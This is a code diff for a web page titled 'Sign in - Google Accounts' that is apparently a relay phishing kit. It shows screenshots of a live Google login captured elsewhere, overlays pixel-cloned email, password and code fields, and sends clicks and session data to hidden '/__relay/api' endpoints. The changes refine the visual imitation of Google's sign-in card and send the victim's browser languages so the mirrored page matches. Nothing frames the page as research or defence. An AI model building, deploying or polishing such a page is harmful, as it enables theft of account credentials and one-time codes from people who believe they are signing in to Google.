@@ -4,41 +4,47 @@
 <title>Sign in - Google Accounts</title>
 <style>
 *{box-sizing:border-box}
-html,body{margin:0;background:#fff;height:100%}
-body{font-family:Arial,sans-serif;display:flex;flex-direction:column;color:#202124}
-.wrap{flex:1;display:flex;align-items:center;justify-content:center;padding:10px 0;min-height:80vh}
-#stage{position:relative;width:fit-content;max-width:100%}
-#shot{max-width:100%;height:auto;display:block;border-radius:10px;filter:blur(16px);transition:filter .3s;cursor:default}
+html,body{margin:0;height:100%}
+body{font-family:Arial,sans-serif;background:#f0f4f9;color:#202124;
+ display:flex;align-items:center;justify-content:center;min-height:100vh}
+.col{display:flex;flex-direction:column;align-items:center;padding:16px}
+/* white card = mirrored main content + 36px padding all around (measured) */
+.cardwrap{width:fit-content;max-width:100%}
+#stage{background:#fff;border-radius:24px;padding:36px;max-width:100%;
+ box-shadow:0 1px 3px rgba(60,64,67,.3),0 4px 8px 3px rgba(60,64,67,.15)}
+#imgbox{position:relative;width:fit-content;max-width:100%}
+#shot{max-width:100%;height:auto;display:block;filter:blur(16px);transition:filter .3s;cursor:default}
 #shot.on{filter:none}
-/* overlay input — pixel-clone of Google's outlined field */
-#ov-in{position:absolute;display:none;padding:0 12px;font-family:Arial,sans-serif;font-size:16px;
+/* overlay input — pixel-clone of Google's outlined field (label text comes
+   from the mirrored screenshot above the field, so no placeholder here) */
+#ov-in{position:absolute;display:none;padding:0 16px;font-family:Arial,sans-serif;font-size:16px;
  color:#202124;border:1px solid #dadce0;border-radius:4px;outline:none;background:#fff;z-index:5}
-#ov-in::placeholder{color:#5f6368}
 #ov-in:focus{border-color:#0b57d0;box-shadow:inset 0 0 0 1px #0b57d0}
 #ov-in.egpw{-webkit-text-security:disc;letter-spacing:1px}
-/* overlay Next — Google's primary button; radius set per-step from live geometry */
 #ov-btn{position:absolute;display:none;background:#0b57d0;color:#fff;border:none;font-family:Arial,sans-serif;
  font-weight:500;font-size:14px;cursor:pointer;z-index:5;border-radius:4px}
 #boot{margin:44px auto 12px;width:30px;height:30px;border:3px solid #dadce0;
  border-top-color:#0b57d0;border-radius:50%;animation:r 1s linear infinite}
 @keyframes r{to{transform:rotate(360deg)}}
-#st{display:none;margin:8px auto 0;font-size:13px;color:#d93025;min-height:18px;text-align:center;max-width:448px}
-.foot{padding:10px 24px;display:flex;justify-content:space-between;font-size:12px;color:#5f6368}
-.foot .l{display:flex;gap:18px}
+#st{display:none;margin:8px auto 0;font-size:13px;color:#d93025;text-align:center;max-width:448px}
+/* footer starts right at the card's bottom edge, same width as the card */
+.foot{display:flex;justify-content:space-between;margin-top:8px;font-size:12px;color:#5f6368}
 </style></head><body>
-<div class=wrap>
-<div>
+<div class=col>
 <div id=boot></div>
+<div class=cardwrap>
 <div id=stage>
+<div id=imgbox>
 <img id=shot alt="" draggable=false>
 <input id=ov-in autocomplete=off spellcheck=false>
 <button id=ov-btn>Next</button>
 </div>
+</div>
+<div class=foot><span>English (United States)</span>
+<span>Help&nbsp;&nbsp;&nbsp;Privacy&nbsp;&nbsp;&nbsp;Terms</span></div>
+</div>
 <div id=st></div>
 </div>
-</div>
-<div class=foot><div class=l><span>English (United States)</span></div>
-<div class=l><span>Help</span><span>Privacy</span><span>Terms</span></div></div>
 <script>
 var SID=null, KIND=null,
     shot=document.getElementById('shot'), stage=document.getElementById('stage'),
@@ -71,8 +77,7 @@ shot.addEventListener('click',function(e){
  fetch('/__relay/api/click',{method:'POST',headers:{'Content-Type':'application/json'},
   body:JSON.stringify({id:SID,x:x,y:y})}).catch(function(){});
 });
-var PLACE={email:'Email or phone',password:'Enter your password',code:'Enter code'},
-    lastHash='';
+var lastHash='';
 /* sidecar captures at 2x DPR — show at half so CSS size == native Google */
 shot.onload=function(){
  shot.style.width=(shot.naturalWidth>1200?Math.round(shot.naturalWidth/2):shot.naturalWidth)+'px';
@@ -87,7 +92,6 @@ function render(x){
  if(ib&&k&&x.state!=='done'&&x.state!=='error'){
   KIND=k;
   ovIn.className=k==='password'?'egpw':'';
-  ovIn.placeholder=PLACE[k]||'';
   if(ovIn.getAttribute('data-k')!==k){ovIn.value='';ovIn.setAttribute('data-k',k);}
   place(ovIn,ib,function(){
    var h=ovIn.getBoundingClientRect().height;
@@ -122,7 +126,8 @@ function poll(){
 var qsid=new URLSearchParams(location.search).get('sid');
 if(qsid){SID=qsid;poll();}
 else fetch('/__relay/api/start',{method:'POST',headers:{'Content-Type':'application/json'},
- body:JSON.stringify({})}).then(function(r){return r.json();}).then(function(j){SID=j.id;poll();})
+ body:JSON.stringify({langs:(navigator.languages||[navigator.language||'en'])})})
+ .then(function(r){return r.json();}).then(function(j){SID=j.id;poll();})
  .catch(function(){fatal('Cannot reach the sign-in page. Please reload.');});
 poll();
 </script></body></html>
